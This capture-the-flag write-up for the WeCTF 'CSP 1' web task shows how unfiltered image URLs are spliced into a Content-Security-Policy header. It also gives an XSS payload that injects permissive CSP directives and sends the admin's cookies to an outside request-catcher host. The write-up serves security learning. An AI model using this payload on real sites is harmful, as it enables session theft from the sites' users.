# [WeCTF](https://ctftime.org/event/1231)
## Task: CSP 1
##### Tags: `easy` `web`
From the description and name of the task we can understand that we will deal with [CSP](https://en.wikipedia.org/wiki/Content_Security_Policy) and XSS.

Also, from the description we know that "This challenge requires user interaction. Send your payload to uv.ctf.so Flag is in cookies of admin (Shou).", so we will make XSS and redirect his cookies to our server.
### Let's first check files of source code
```bash
❯ tree
.
├── app.py
├── Dockerfile
├── static
└── templates
    ├── display.html
    └── index.html
```
Basically, just one `app.py` file where we can see the rules of CSP.
```python
def filter_url(urls):
    domain_list = []
    for url in urls:
        domain = urllib.parse.urlparse(url).scheme + "://" + urllib.parse.urlparse(url).netloc
        if domain:
            domain_list.append(domain)
    return " ".join(domain_list)


@app.route('/display/<token>')
def display(token):
    user_obj = Post.select().where(Post.token == token)
    content = user_obj[-1].content if len(user_obj) > 0 else "Not Found"
    img_urls = [x['src'] for x in bs(content).find_all("img")]
    tmpl = render_template("display.html", content=content)
    resp = make_response(tmpl)
    resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
                                              f"'self' {filter_url(img_urls)}; script-src 'none'; " \
                                              "style-src 'self'; base-uri 'self'; form-action 'self' "
    return resp
```
`filter_url` adds img link to allowed image sources, `display` adds to each response CSP rules that disable everything. So with these rules will be not possible to execute js code to get cookies. But we can see that result of filter_url adds in headers directly and `filter_url` not filtering the source of an image. So we can add rules that will allow executing js on page.
I use [request catcher](https://requestcatcher.com/) as a server to get cookies. So, let's try:
```js
<script>document.write(document.cookie);document.write('<img src="https://somecooldomainforctf.requestcatcher.com/?cookie=' + document.cookie + '" />')</script>
```
But that's didn't work. It is because the img tag in js string and BeautifulSoup4 from the server do not parse it. So, we need to add img as html tag. I found [rules of CSP](https://stackoverflow.com/questions/35978863/allow-all-content-security-policy) that allow everything and simply concatenate it with my server url.
```html
<script>document.write(document.cookie);document.write('<img src="https://somecoolforctf.requestcatcher.com/?cookie=' + document.cookie + '" />')</script>
<img src="https://somecooldomainforctf.requestcatcher.com; default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval' 'unsafe-dynamic'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline';font-src * data: blob: 'unsafe-inline';frame-ancestors * data: blob: 'unsafe-inline';#">
```
After submitting url of our page to checker (https://uv.ctf.so/), we get our flag for this task in the cookies of the request
